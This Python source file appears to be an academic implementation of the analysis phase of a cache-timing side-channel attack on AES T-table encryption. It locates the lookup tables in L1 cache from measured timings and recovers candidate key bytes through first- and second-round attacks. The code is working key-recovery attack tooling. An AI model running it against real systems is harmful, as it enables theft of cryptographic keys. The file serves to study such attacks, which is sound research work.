# Crypto.py

# Description:
#   Program that handles the crypto-analysis phase of the side-channel attack
#       1Round Attack - Tromer score approach, choosing the lines with the highest average score
#       2Round Attack - Naive approch using threshold to cut all the possible 4keyByte values




import math
import statistics as st
from pyfinite import ffield  # To perform GF(256) multiplications


# Global Variables

delta = 16                                                              # Max number of table elements in a L1-D cache block
s = [                                                                   # Sbox - 256 
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
        0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
        0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
        0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
        0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
        0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
        0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
        0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
        0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
        0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
        0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
        0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
        0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
        0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
        ]


# Table/Offset Attack Variables:
table_elem_dic = {}                                                 # dictionary that links table & element index to the respective L1 line that mapps it
t0e_line = 0                                                        # L1 line of beginning of enc. table 0 
offset_elem = 0                                                     # minimum offset - i.e.: the minimum element shift - example: shift of 14 in a L1 block means offset_elem = 2

# Round 1 Attack Variables:
first_candidate_k = []                                              # Lowest possible key byte value from 16 key bytes 

# Round 2 Attack Variables:
fk = [[] for x in range(16)]                                        # Array of the final keys extracted
line_value_threshold = 50                                           # Max value a line can take to be considered a used line



# Main Program
def main():
    table_offset_attack()
    print("t0e_line: ", t0e_line)
    print("offset_elem: ", offset_elem)

    round_1_attack()
    print("first_candidate_k : ", first_candidate_k)

    round_2_attack()
    print("final key:", fk)




# Implement table/offset attack
def table_offset_attack():
     
    global offset_elem
    global t0e_line

    tab_file = open("side_channel_info/table.out", "r")
    table_scores = [int(i) for i in tab_file]
    tab_file.close()

    # Creating of sum - structure containg the scores of each group of 4 lines 16 lines apart
    sum = [0 for x in range(16)]
    for i in range(16):
        for j in range(4):
            sum[i] += table_scores[i+j*16]
    print("sum:", sum)

    # Creating sum structure average
    sum_avg = st.mean(sum)
    print("sum_avg", sum_avg)

    # Creating structure containg the 2 highest scores of sum ~ sum_top_2
    # Creating structure containg the 2 indices of sum containing the highest scores ~ sum_top_2_index
    
    sum_top_2 = sorted(sum)[-2:]
    sum_top_2_index = sorted(range(len(sum)), key=lambda k: sum[k])[-2:]

    print("sum_top_2", sum_top_2)

    # Offset checking (0 or 32bit)
    offset_elem = 0
    set_i = sum_top_2_index[1]
    #under testing...
    if (are_lines_neighboors(sum_top_2_index,len(sum)) and is_above_avg(sum_avg,sum_top_2)):
        sum_top_2_index.sort()
        set_i = sum_top_2_index[0]
        offset_elem = 8



    # Get L1 lines used by the beginning of each table
    set_lines = []
    for i in range(4):
        set_lines.append(table_scores[set_i+i*16])
    

    # Get T0 L1 line ~ (and consequently T1,T2,T3)
    minn = min(set_lines)
    t3_line_index = [i for i, j in enumerate(set_lines) if j == minn]
    t0_line_index = (t3_line_index[0]+1)%4
    t0e_line = set_i + (t0_line_index*16)
    

    # Table element structure: (table index, element index) : L1 line
    #   Warning: It assumes all the tables are consequent in memory
    for t in range(4):
        for e in range(256):
            line = (t0e_line + ((offset_elem + e + 256*t)//delta)) %64 
            table_elem_dic[(t,e)] = line


    #print(table_indices_sorted)
    #print(table_scores)
    #print("first| second | offset ")
    #print(first, second, offset_elements)
    # print(table_elem_dic)



def round_1_attack():


    # Local Variables
    hk_score = [[0 for x in range(256)] for y in range(16)]             # Score structure per key byte value
    candidate_k = []                                                    # List of candidate key bytes per byte
    l=0                                                                 # Measurement file index


    while(True):
        try:
            p,scores  = read_files(l)
            l+=1
        except IOError:
            break

        # For each meas. iteration each hip. key byte gets updated with a new score (nº of clock cycles)
        for bi, byte in enumerate (hk_score):
            for hki in range(len(byte)):
                hx = p[bi] ^ hki   
                hline = table_elem_dic[(bi%4,hx)]
                new_score = scores[hline]
                hk_score[bi][hki] += new_score


    # for i in range(256):
    #     print(str(i) + " : " + str(hk_score[0][i]))

    for item in (hk_score):
        a = []
        for index in range(len(item)):
            if item[index] == max(item):
                a.append(index)
        a.sort()    
        candidate_k.append(a.copy())

        
    # sort candidate and pick the min value of each key
    for item in candidate_k:
        first_candidate_k.append(item[0])
    




def round_2_attack():


    # Local Variables
    F = ffield.FField(8)                                                # Galouis Field(256)
    hx = [x for x in range(4)]                                          # Hipotetical index
    hk = [0 for x in range(16)]                                         # Hipotetical key
    n_comb = 16 - offset_elem                                           # number of possible combinations of each key byte | e.g: 0->16 | 8->8 | 12->4 | 14->2
    n_bits = int(math.log2(n_comb))                                     # number of bits from each key byte that remain unknown
    lk = [[x for x in range(n_comb**4)] for y in range(4)]              # Structure containing all the combinations from the 4 equations
    l=0                                                                 # Measurement file index

    
    while(True):
        try:
            p,scores  = read_files(l)
            l+=1
        except IOError:
            break


        # get the lines scores below the 1-standard-deviation
        avg = st.mean(scores)
        dev = st.stdev(scores)
        limit =  int(avg-1*dev)
        unsed_lines = [index for index,elem in enumerate (scores) if elem <= limit]
        
        #consider using byarray instead of int
        for low_hkA in range(0, (n_comb)):
            for low_hkB in range(0, (n_comb)):
                for low_hkC in range(0, (n_comb)):
                    for low_hkD in range(0, (n_comb)):
                        hk[0] =  (first_candidate_k[0] + low_hkA)
                        hk[1] =  (first_candidate_k[1] + low_hkB)
                        hk[2] =  (first_candidate_k[2] + low_hkC)
                        hk[3] =  (first_candidate_k[3] + low_hkD)
                        hk[4] =  (first_candidate_k[4] + low_hkA)
                        hk[5] =  (first_candidate_k[5] + low_hkB)
                        hk[6] =  (first_candidate_k[6] + low_hkC)
                        hk[7] =  (first_candidate_k[7] + low_hkD)
                        hk[8] =  (first_candidate_k[8] + low_hkA)
                        hk[9] =  (first_candidate_k[9] + low_hkB)
                        hk[10] = (first_candidate_k[10] + low_hkC)
                        hk[11] = (first_candidate_k[11] + low_hkD)
                        hk[12] = (first_candidate_k[12] + low_hkA)
                        hk[13] = (first_candidate_k[13] + low_hkB)
                        hk[14] = (first_candidate_k[14] + low_hkC)
                        hk[15] = (first_candidate_k[15] + low_hkD)


                        hx[0] = s[p[0] ^ hk[0]] ^ s[p[5] ^ hk[5]] ^ F.Multiply(2, s[p[10]^hk[10]]) ^ F.Multiply(3, s[p[15]^hk[15]]) ^ s[hk[15]] ^ first_candidate_k[2]
                        hx[1] = s[p[4] ^ hk[4]] ^ F.Multiply(2,s[p[9] ^ hk[9]]) ^ F.Multiply(3, s[p[14]^hk[14]]) ^ s[p[3]^hk[3]] ^ s[hk[14]] ^ first_candidate_k[1] ^ first_candidate_k[5]
                        hx[2] = F.Multiply(2,s[p[8] ^ hk[8]]) ^ F.Multiply(3,s[p[13] ^ hk[13]]) ^ s[p[2]^hk[2]] ^ s[p[7]^hk[7]] ^ s[hk[13]] ^ first_candidate_k[0] ^ first_candidate_k[4] ^ first_candidate_k[8] ^ 1
                        hx[3] = F.Multiply(3,s[p[12] ^ hk[12]]) ^ s[p[1]^hk[1]] ^ s[p[6]^hk[6]] ^ F.Multiply(2, s[p[11]^hk[11]]) ^ s[hk[12]] ^ first_candidate_k[3] ^ first_candidate_k[7] ^ first_candidate_k[11] ^ first_candidate_k[15]
     
                        comb_index = (low_hkA<<(n_bits*3)) + (low_hkB<<(n_bits*2)) + (low_hkC<<(n_bits*1)) + low_hkD
                        for i in range(0,4):
                            hline = table_elem_dic[((2-i)%4, hx[i])]
                            # Change (Not checking the scores p/ line against a threshold 
                            # but if it's below 1 of deviation)
                            if (hline in unsed_lines):
                                lk[i][comb_index] = -1


    # Retrieve the remaining combinations from lk[]
    lk_list = [[]for y in range(4)]
    for lk_index, lk_item in enumerate(lk):
        for comb in lk_item:
            if comb != -1:
                lk_list[lk_index].append(comb)    
    


    # Registering discovered key bytes
    for lk_index, lk_item in enumerate(lk_list):
        set_final_key(fk, lk_index,lk_item, n_comb, n_bits)






# Auxiliar Functions

# Registers the discovered keys bytes values by the attack
def set_final_key(fk, i, lk_item, n_comb, n_bits):

    for item in lk_item:
        for j in range(0,4):
            key_byte = first_candidate_k[(i*4+j*5) %16] + (item>>((3-j)*n_bits) & (n_comb-1))
            if key_byte not in fk[(i*4+j*5)%16]:
                fk[(i*4+j*5)%16].append(key_byte)
    



# Get the content of meas, victim files
def read_files(l):
    
    meas_file = open("side_channel_info/meas#" + str(l) + ".out", "r")

    plaintext_raw = meas_file.readline()
    plaintext_raw = plaintext_raw[:-2]

    plaintext = [int(i) for i in plaintext_raw.split('.')]
    scores = [int(i) for i in meas_file]

    meas_file.close()
    
    return plaintext, scores



# Checks whether a list contains all the elements positive or not

def is_above_avg(avg, lst):
    for item in lst:
        if (item < avg):
            return False
    return True
    

def are_lines_neighboors(lst,len):
    statement1 = ((lst[0] + 1) %len ==lst[1])
    statement2 = ((lst[1] + 1) %len ==lst[0])

    print("statement1", statement1)
    print("statement2", statement2)
    
    return statement1 or statement2


# Program execution
main()